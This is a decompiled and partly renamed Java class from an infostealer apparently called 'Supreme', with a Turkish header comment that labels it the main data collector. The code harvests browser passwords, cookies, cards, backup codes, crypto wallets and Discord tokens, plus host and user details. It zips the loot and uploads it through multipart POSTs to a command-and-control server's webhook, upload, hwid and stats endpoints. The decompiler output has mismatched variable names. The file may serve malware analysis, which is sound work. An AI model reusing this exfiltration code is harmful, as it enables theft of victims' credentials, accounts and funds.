/*\n * ========================================\n * DEOBFUSCATED: DataCollector.java\n * Original: a/e.java\n * ----------------------------------------\n * Ana veri toplayıcı - browser şifre/cookie/kart + Discord token çalma + webhook gönderme (628 satır)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package a;

import a.a;
import a.f;
import a.g;
import b.d;
import c.c;
import c.c$EmbedObject;
import c.r;
import d.k;
import d.l;
import d.p;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class e {
    private static String serverUrl = "http://127.0.0.1:1338";
    private static String apiKey = "";

    public static void collect(String url, String key, boolean retry) {
        e.a(string, string2, bl, false);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static void collectInternal(String url, String key, boolean retry, boolean full) {
        Object object;
        String string3;
        Object object2;
        a = string != null && !string.isEmpty() ? string : a;
        b = string2 != null ? string2 : "";
        f f2 = new f();
        if (bl2) {
            try {
                p.a();
            }
            catch (Throwable throwable) {
                // empty catch block
            }
            c.logEvent("relog start \u2014 token CHECKED cleared");
        }
        String string4 = string + "/v1/webhook";
        Object object3 = new Object();
        int[] nArray = new int[]{0};
        CountDownLatch countDownLatch = new CountDownLatch(1);
        List<String> list = p.b();
        c.logEvent((bl2 ? "relog" : "boot") + " disk tokens found=" + list.size());
        Thread thread = new Thread(() -> e.lambda$run$0(list, bl2, countDownLatch, object3, bl, string4, string2, nArray), "sp-tokens");
        thread.setDaemon(true);
        thread.start();
        c.logEvent("parallel start tokens+browser");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);
        try {
            object2 = b.a.a.a(zipOutputStream);
            f2.a(object2[0]);
            f2.b(object2[1]);
            f2.c(object2[2]);
            f2.d(object2[3]);
        }
        catch (Throwable throwable) {
            c.logEvent("browser extract failed: " + throwable.getClass().getSimpleName() + " " + throwable.getMessage());
        }
        try {
            b.e.a.b(zipOutputStream);
        }
        catch (Throwable throwable) {
            c.logEvent("backup codes failed: " + throwable.getMessage());
        }
        try {
            d.a.b(zipOutputStream);
            f2.e(d.a.a());
        }
        catch (Throwable throwable) {
            c.logEvent("wallets failed: " + throwable.getMessage());
        }
        try {
            zipOutputStream.putNextEntry(new ZipEntry("tokens.txt"));
            if (list.isEmpty()) {
                zipOutputStream.write("none\n".getBytes(StandardCharsets.UTF_8));
                c.logEvent("tokens.txt written count=0");
            } else {
                object2 = list.iterator();
                while (object2.hasNext()) {
                    String string5 = (String)object2.next();
                    if (string5 == null || string5.isEmpty()) continue;
                    zipOutputStream.write((string5 + "\n").getBytes(StandardCharsets.UTF_8));
                }
                c.logEvent("tokens.txt written count=" + list.size());
            }
            zipOutputStream.closeEntry();
        }
        catch (Throwable throwable) {
            c.logEvent("tokens.txt write failed: " + throwable.getMessage());
        }
        try {
            zipOutputStream.close();
            byteArrayOutputStream.close();
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        object2 = byteArrayOutputStream.toByteArray();
        boolean bl3 = object2 != null && ((Object)object2).length > 0 && (long)((Object)object2).length < 0x800000L;
        String[] stringArray = new String[]{null};
        Thread thread2 = null;
        if (!bl3 && object2 != null && ((Object)object2).length > 0) {
            thread2 = new Thread(() -> e.lambda$run$1(string, string2, stringArray, (byte[])object2));
            thread2.setDaemon(true);
            thread2.start();
            c.logEvent("zip too large for direct (" + ((Object)object2).length + " bytes), uploading...");
        } else if (bl3) {
            c.logEvent("zip small enough for direct attach (" + ((Object)object2).length + " bytes)");
        }
        String string6 = System.getenv("COMPUTERNAME");
        if (string6 == null || string6.isEmpty()) {
            string6 = System.getenv("HOSTNAME");
        }
        if (string6 == null || string6.isEmpty()) {
            string6 = "UNKNOWN";
        }
        if ((string3 = System.getProperty("user.name")) == null || string3.isEmpty()) {
            string3 = "Unknown";
        }
        String string7 = System.getProperty("os.name", "") + " " + System.getProperty("os.version", "");
        try {
            e.a(string, string2, string6, string3, string7);
        }
        catch (Throwable throwable) {
            c.logEvent("hwid report failed: " + throwable.getMessage());
        }
        c$EmbedObject c$EmbedObject = null;
        try {
            c$EmbedObject = l.a(d.a.b, d.a.c, d.a.d, d.a.e, d.a.f, d.a.g);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        if (thread2 != null) {
            try {
                thread2.join(60000L);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        c$EmbedObject c$EmbedObject2 = null;
        try {
            object = bl3 ? null : stringArray[0];
            c$EmbedObject2 = l.a(b.a.a.b, b.a.a.c, (String)object, f2.a(), f2.b(), f2.c(), f2.d(), 0);
        }
        catch (Throwable throwable) {
            c.logEvent("summary embed failed: " + throwable.getMessage());
        }
        object = bl3 ? object2 : null;
        c.logEvent("send classic embeds direct=" + bl3 + " dl=" + stringArray[0]);
        try {
            e.a(string4, string2, object3, 1000, c$EmbedObject2, null, null, null, c$EmbedObject, (byte[])object);
        }
        finally {
            countDownLatch.countDown();
        }
        try {
            thread.join(bl2 ? 120000L : 90000L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (thread.isAlive()) {
            c.logEvent("token thread still running after send \u2014 embeds=" + nArray[0]);
        }
        if (bl2) {
            c.logEvent("relog tokens embeds=" + nArray[0]);
        }
        c.logEvent("ready dl=" + stringArray[0] + " direct=" + bl3 + " tokens=" + nArray[0]);
        try {
            e.a(string, string2, f2.a(), f2.b(), f2.e(), nArray[0]);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static void sendBrowserSummary(String url, String key, Object lock, int count, c$EmbedObject c$EmbedObject, c$EmbedObject c$EmbedObject2, c$EmbedObject c$EmbedObject3, c$EmbedObject c$EmbedObject4, c$EmbedObject c$EmbedObject5, byte[] byArray) {
        Object object2 = object;
        synchronized (object2) {
            c.logEvent("send browser/summary now (not waiting tokens)");
            if (c$EmbedObject != null) {
                try {
                    boolean bl = byArray != null && byArray.length > 0;
                    String string3 = null;
                    if (bl) {
                        String string4 = System.getProperty("user.name", "User");
                        String string5 = l.f().replace('.', '-');
                        string3 = string4 + "-" + string5 + ".zip";
                    }
                    e.a(string, string2, c$EmbedObject, (byte[])(bl ? byArray : null), string3);
                    c.logEvent("send gap sleep=" + n2);
                    Thread.sleep(n2);
                }
                catch (Throwable throwable) {
                    c.logEvent("api summary failed: " + throwable.getMessage());
                }
            }
            if (c$EmbedObject5 != null) {
                try {
                    e.a(string, string2, c$EmbedObject5, null, null);
                    c.logEvent("send gap sleep=" + n2);
                    Thread.sleep(n2);
                }
                catch (Throwable throwable) {
                    c.logEvent("api wallet failed: " + throwable.getMessage());
                }
            }
        }
    }

    private static void sendEmbedWithZip(String url, String key, c$EmbedObject embed, byte[] zipData, String hwid) throws Exception {
        if (c$EmbedObject == null) {
            return;
        }
        boolean bl = byArray != null && byArray.length > 0 && string3 != null && string3.toLowerCase().endsWith(".zip");
        String string4 = c$EmbedObject.toJson();
        String string5 = "{\"username\":" + e.a("Supreme") + ",\"avatar_url\":" + e.a("https://i.imgur.com/YYumsB0.png") + ",\"embeds\":[" + string4 + "]}";
        e.a(string, string2, string5, (byte[])(bl ? byArray : null), bl ? string3 : null);
    }

    private static void postWithRetry(String url, String key, String endpoint, byte[] data, String hwid) throws Exception {
        Exception exception = null;
        for (int i2 = 0; i2 < 3; ++i2) {
            try {
                int n2 = e.b(string, string2, string3, byArray, string4);
                if (n2 != 429) {
                    return;
                }
                long l2 = 2000L * (long)(i2 + 1);
                c.logEvent("api relay HTTP 429 \u2014 backoff " + l2 + "ms");
                Thread.sleep(l2);
                continue;
            }
            catch (Exception exception2) {
                exception = exception2;
                Thread.sleep(1000L * (long)(i2 + 1));
            }
        }
        if (exception != null) {
            throw exception;
        }
    }

    private static int postMultipart(String url, String key, String endpoint, byte[] data, String hwid) throws Exception {
        if (byArray != null && byArray.length > 0) {
            String string5 = "----ApiRelay" + System.currentTimeMillis();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byteArrayOutputStream.write(("--" + string5 + "\r\n").getBytes(StandardCharsets.UTF_8));
            byteArrayOutputStream.write("Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n".getBytes(StandardCharsets.UTF_8));
            byteArrayOutputStream.write(string3.getBytes(StandardCharsets.UTF_8));
            byteArrayOutputStream.write(("\r\n--" + string5 + "\r\n").getBytes(StandardCharsets.UTF_8));
            byteArrayOutputStream.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + string4 + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes(StandardCharsets.UTF_8));
            byteArrayOutputStream.write(byArray);
            byteArrayOutputStream.write(("\r\n--" + string5 + "--\r\n").getBytes(StandardCharsets.UTF_8));
            byte[] byArray2 = byteArrayOutputStream.toByteArray();
            HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string).openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + string5);
            httpURLConnection.setRequestProperty("x-build-key", string2);
            httpURLConnection.setConnectTimeout(30000);
            httpURLConnection.setReadTimeout(30000);
            try (OutputStream outputStream = httpURLConnection.getOutputStream();){
                outputStream.write(byArray2);
                outputStream.flush();
            }
            int n2 = httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
            if (n2 >= 400) {
                c.logEvent("api relay HTTP " + n2);
            }
            return n2;
        }
        byte[] byArray3 = string3.getBytes(StandardCharsets.UTF_8);
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string).openConnection();
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Content-Type", "application/json");
        httpURLConnection.setRequestProperty("x-build-key", string2);
        httpURLConnection.setConnectTimeout(30000);
        httpURLConnection.setReadTimeout(30000);
        try (OutputStream outputStream = httpURLConnection.getOutputStream();){
            outputStream.write(byArray3);
            outputStream.flush();
        }
        int n3 = httpURLConnection.getResponseCode();
        httpURLConnection.disconnect();
        if (n3 >= 400) {
            c.logEvent("api relay HTTP " + n3);
        }
        return n3;
    }

    public static void sendSystemInfo(String url, String key) {
        String string3;
        String string4 = System.getenv("COMPUTERNAME");
        if (string4 == null || string4.isEmpty()) {
            string4 = System.getenv("HOSTNAME");
        }
        if (string4 == null || string4.isEmpty()) {
            string4 = "UNKNOWN";
        }
        if ((string3 = System.getProperty("user.name")) == null || string3.isEmpty()) {
            string3 = "Unknown";
        }
        String string5 = System.getProperty("os.name", "") + " " + System.getProperty("os.version", "");
        e.a(string, string2, string4, string3, string5);
    }

    private static void sendTokenNotification(String url, String key, String token, String hwid, String password) {
        if (string == null || string.isEmpty()) {
            return;
        }
        try {
            String string6 = HwidGenerator.getHwid();
            String string7 = "{\"hwid\":" + e.a(string6) + ",\"pcName\":" + e.a(string3) + ",\"userName\":" + e.a(string4) + ",\"os\":" + e.a(string5) + "}";
            URL uRL = new URL(string + "/api/hwid");
            HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setRequestProperty("x-build-key", string2);
            httpURLConnection.setConnectTimeout(15000);
            httpURLConnection.setReadTimeout(15000);
            byte[] byArray = string7.getBytes(StandardCharsets.UTF_8);
            try (OutputStream outputStream = httpURLConnection.getOutputStream();){
                outputStream.write(byArray);
                outputStream.flush();
            }
            int n2 = httpURLConnection.getResponseCode();
            c.logEvent("hwid report HTTP " + n2 + " hwid=" + string6);
            try {
                g.a("hwid report HTTP " + n2 + " hwid=" + string6);
            }
            catch (Throwable throwable) {
                // empty catch block
            }
            httpURLConnection.disconnect();
        }
        catch (Exception exception) {
            c.logEvent("hwid report error: " + exception.getMessage());
            try {
                g.a("hwid report error: " + exception.getMessage());
            }
            catch (Throwable throwable) {
                // empty catch block
            }
        }
    }

    private static void sendBrowserStats(String url, String key, int cookies, int passwords, int cards, int wallets) {
        if (string == null || string.isEmpty()) {
            return;
        }
        try {
            String string3 = HwidGenerator.getHwid();
            String string4 = "{\"" + "passwords" /* r.jp() */ + "\":" + n2 + ",\"" + "cookies" /* r.jc() */ + "\":" + n3 + ",\"" + "wallets" /* r.jw() */ + "\":" + n4 + ",\"" + "tokens" /* r.jt() */ + "\":" + n5 + "}";
            URL uRL = new URL(string + "/v1/stats");
            HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setRequestProperty("x-build-key", string2);
            httpURLConnection.setRequestProperty("x-hwid", string3);
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            byte[] byArray = string4.getBytes(StandardCharsets.UTF_8);
            try (OutputStream outputStream = httpURLConnection.getOutputStream();){
                outputStream.write(byArray);
                outputStream.flush();
            }
            httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static String escapeJson(String s) {
        if (string == null) {
            return "\"\"";
        }
        StringBuilder stringBuilder = new StringBuilder("\"");
        block7: for (char c2 : string.toCharArray()) {
            switch (c2) {
                case '\"': {
                    stringBuilder.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    stringBuilder.append("\\\\");
                    continue block7;
                }
                case '\n': {
                    stringBuilder.append("\\n");
                    continue block7;
                }
                case '\r': {
                    stringBuilder.append("\\r");
                    continue block7;
                }
                case '\t': {
                    stringBuilder.append("\\t");
                    continue block7;
                }
                default: {
                    if (c2 < ' ') {
                        stringBuilder.append("\\u").append(String.format("%04x", c2));
                        continue block7;
                    }
                    stringBuilder.append(c2);
                }
            }
        }
        return stringBuilder.append("\"").toString();
    }

    private static String uploadZipToC2(byte[] zipData, String hwid) throws Exception {
        int n2;
        int n3;
        String string2 = (a != null ? a : "http://127.0.0.1:1338").replaceAll("/+$", "");
        String string3 = "----SupremeApi" + System.currentTimeMillis();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(("--" + string3 + "\r\n").getBytes(StandardCharsets.UTF_8));
        byteArrayOutputStream.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + string + "\"\r\nContent-Type: application/zip\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        byteArrayOutputStream.write(byArray);
        byteArrayOutputStream.write(("\r\n--" + string3 + "--\r\n").getBytes(StandardCharsets.UTF_8));
        byte[] byArray2 = byteArrayOutputStream.toByteArray();
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string2 + "/upload").openConnection();
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + string3);
        if (b != null && !b.isEmpty()) {
            httpURLConnection.setRequestProperty("x-build-key", b);
        }
        httpURLConnection.setConnectTimeout(120000);
        httpURLConnection.setReadTimeout(120000);
        try (OutputStream outputStream = httpURLConnection.getOutputStream();){
            outputStream.write(byArray2);
            outputStream.flush();
        }
        int n4 = httpURLConnection.getResponseCode();
        if (n4 != 200) {
            String string4 = "";
            try {
                InputStream inputStream = httpURLConnection.getErrorStream();
                if (inputStream != null) {
                    byte[] byArray3 = new byte[512];
                    int n5 = inputStream.read(byArray3);
                    if (n5 > 0) {
                        string4 = new String(byArray3, 0, n5, StandardCharsets.UTF_8);
                    }
                    inputStream.close();
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            httpURLConnection.disconnect();
            throw new Exception("api upload HTTP " + n4 + " " + string4);
        }
        StringBuilder stringBuilder = new StringBuilder();
        try (Object object = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), StandardCharsets.UTF_8));){
            String string5;
            while ((string5 = ((BufferedReader)object).readLine()) != null) {
                stringBuilder.append(string5);
            }
        }
        httpURLConnection.disconnect();
        object = stringBuilder.toString();
        int n6 = ((String)object).indexOf("\"link\":\"");
        if (n6 >= 0 && (n3 = ((String)object).indexOf("\"", n2 = n6 + 8)) > n2) {
            return ((String)object).substring(n2, n3);
        }
        throw new Exception("api upload parse failed: " + ((String)object).substring(0, Math.min(((String)object).length(), 200)));
    }

    private static void collectAndSend(String url, String key, String[] tokens, byte[] data) {
        try {
            a = string != null && !string.isEmpty() ? string : a;
            b = string2 != null ? string2 : b;
            stringArray[0] = e.a(byArray, "data.zip");
            c.logEvent("api upload ok: " + stringArray[0] + " size=" + byArray.length);
        }
        catch (Throwable throwable) {
            c.logEvent("api upload failed: " + throwable.getMessage());
        }
    }

    private static void lambda$run$1(String string, String string2, String[] stringArray, byte[] byArray) {
        e.a(string, string2, stringArray, byArray);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static void lambda$run$0(List list, boolean bl, CountDownLatch countDownLatch, Object object, boolean bl2, String string, String string2, int[] nArray) {
        try {
            List list2;
            Object object2;
            Object object3;
            List<String> list3 = p.a(list, bl);
            c.logEvent((bl ? "relog" : "boot") + " tokens=" + list3.size());
            ArrayList<Object[]> arrayList = new ArrayList<Object[]>();
            for (String object4 : list3) {
                try {
                    Object[] throwable = k.a(object4, null, null);
                    if (throwable == null) {
                        c.logEvent("token user-data null, retry minimal");
                        throwable = k.b(object4, null, null);
                    }
                    if (throwable == null) {
                        c.logEvent("token skipped \u2014 collectUserData failed");
                        continue;
                    }
                    object3 = l.a(throwable);
                    object2 = l.c(throwable);
                    list2 = l.d((Map<String, Object>)throwable);
                    if (object3 != null) {
                        c.logEvent("token embed ok user=" + String.valueOf(throwable.get("username")));
                    } else {
                        c.logEvent("token embed null user=" + String.valueOf(throwable.get("username")));
                    }
                    arrayList.add(new Object[]{throwable.get("username"), object3, object2, list2});
                }
                catch (Throwable throwable) {
                    c.logEvent("token loop error: " + throwable.getMessage());
                }
            }
            c.logEvent("token embeds ready count=" + arrayList.size());
            try {
                countDownLatch.await(180L, TimeUnit.SECONDS);
            }
            catch (InterruptedException interruptedException) {
                // empty catch block
            }
            boolean bl3 = false;
            for (Object[] throwable : arrayList) {
                object3 = throwable[0] == null ? "?" : String.valueOf(throwable[0]);
                object2 = (c$EmbedObject)throwable[1];
                list2 = (List)throwable[2];
                List list4 = throwable.length > 3 ? (List)throwable[3] : null;
                try {
                    Object throwable2 = object;
                    synchronized (throwable2) {
                        c$EmbedObject c$EmbedObject;
                        if (bl2 && !bl3) {
                            try {
                                Iterator throwable3 = "{\"username\":" + e.a("Supreme") + ",\"avatar_url\":" + e.a("https://i.imgur.com/YYumsB0.png") + ",\"content\":\"@everyone\"}";
                                e.a(string, string2, throwable3, null, null);
                                c.logEvent("send gap sleep=1000");
                                Thread.sleep(1000L);
                                bl3 = true;
                            }
                            catch (Throwable throwable4) {
                                c.logEvent("api ping failed: " + throwable4.getMessage());
                            }
                        }
                        if (object2 != null) {
                            e.a(string, string2, (c$EmbedObject)object2, null, null);
                            nArray[0] = nArray[0] + 1;
                            c.logEvent("send token embed user=" + (String)object3);
                            c.logEvent("send gap sleep=1000");
                            Thread.sleep(1000L);
                        }
                        if (list2 != null) {
                            for (Object e2 : list2) {
                                c$EmbedObject = (c$EmbedObject)e2;
                                e.a(string, string2, c$EmbedObject, null, null);
                                nArray[0] = nArray[0] + 1;
                                c.logEvent("send token/hq friends embed");
                                c.logEvent("send gap sleep=1000");
                                Thread.sleep(1000L);
                            }
                        }
                        if (list4 != null) {
                            for (Object e2 : list4) {
                                c$EmbedObject = (c$EmbedObject)e2;
                                e.a(string, string2, c$EmbedObject, null, null);
                                nArray[0] = nArray[0] + 1;
                                c.logEvent("send token/hq servers embed");
                                c.logEvent("send gap sleep=1000");
                                Thread.sleep(1000L);
                            }
                        }
                    }
                }
                catch (Throwable throwable5) {
                    c.logEvent("token send error: " + throwable5.getMessage());
                }
            }
        }
        catch (Throwable throwable) {
            c.logEvent("token collect failed: " + throwable.getMessage());
        }
    }
}

